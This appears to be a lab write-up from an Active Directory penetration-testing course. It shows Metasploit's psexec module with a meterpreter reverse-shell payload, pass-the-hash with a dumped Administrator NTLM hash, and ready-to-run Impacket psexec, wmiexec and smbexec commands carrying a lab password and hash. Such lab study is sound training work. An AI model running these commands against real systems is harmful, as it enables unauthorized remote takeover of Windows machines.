**Gaining Shell Access**

Lets open msfconsole and search psexec

<img width="720" height="505" alt="image" src="https://github.com/user-attachments/assets/f9a557e6-66ff-498e-8e79-4f0b633894d8" />

Lets use this module

<img width="720" height="506" alt="image" src="https://github.com/user-attachments/assets/98a5666b-82ab-44bb-9007-af6b40f55f9a" />

Here, the payload is **windows/meterpreter/reverse_tcp** which is 32 bit. Lets change it to 64 bit

<img width="720" height="80" alt="image" src="https://github.com/user-attachments/assets/dd9cd93e-9766-458b-bc83-07ee93382eb8" />

Lets set few other options as well

<img width="630" height="156" alt="image" src="https://github.com/user-attachments/assets/c8d3d3d4-5f8f-453c-b134-50468f6a7396" />

We have put the Punisher machine IP address.

<img width="717" height="507" alt="image" src="https://github.com/user-attachments/assets/13144029-9db9-4702-8d67-0642e62b3ad2" />

Lets check the targets

<img width="580" height="280" alt="image" src="https://github.com/user-attachments/assets/ff996184-6ca9-441d-989c-45e2f0e74532" />

By default its Automatic, if it does not work, we can use other options.

Lets execute the attack

<img width="720" height="157" alt="image" src="https://github.com/user-attachments/assets/3f50b563-b33d-4ed5-ac78-45cae796bc18" />

And we got a shell

<img width="697" height="307" alt="image" src="https://github.com/user-attachments/assets/d61dfb95-65d2-44df-8e5a-0ced07bd93f0" />

We are NT Authority

Lets background the session

<img width="720" height="176" alt="image" src="https://github.com/user-attachments/assets/af2d8f87-0cc9-42ba-b944-094a68a659c2" />

Now, we will perform NTLM hash attack

<img width="720" height="391" alt="image" src="https://github.com/user-attachments/assets/85e941a4-27b3-45d9-8a22-c08f6d9220d4" />

We will change the user and password to a local administrator and its hash

In the last lab we have dumped the NTLM hash for administrator.

**Administrator:500:aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f:::**

Also we don’t need smbdomain here. Lets unset it

Lets set the password as hash

<img width="720" height="365" alt="image" src="https://github.com/user-attachments/assets/abee379b-699f-43a8-af8e-3b9b138f3508" />

And we got a shell again.

Now, lets do it manual way

***psexec.py MARVEL/fcastle:’Password1'@192.168.1.11***

<img width="720" height="274" alt="image" src="https://github.com/user-attachments/assets/19ddde33-45a0-4569-94ca-edcbd80344ba" />

And we got a shell.

We can use the hash as well

***psexec.py administrator@192.168.1.11 -hashes aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f***

<img width="720" height="211" alt="image" src="https://github.com/user-attachments/assets/52ab07ea-c33e-41f7-aeff-d3ab00a08044" />

Lets say if psexec is not working, we can use other tools as well

***wmiexec.py administrator@192.168.1.11 -hashes aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f***

<img width="720" height="173" alt="image" src="https://github.com/user-attachments/assets/c56c20eb-0b1c-4402-a097-9169202df692" />

***smbexec.py administrator@192.168.1.11 -hashes aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f***

<img width="720" height="151" alt="image" src="https://github.com/user-attachments/assets/c70fde8e-e3b3-405f-a8f7-2e9d9a90af00" />

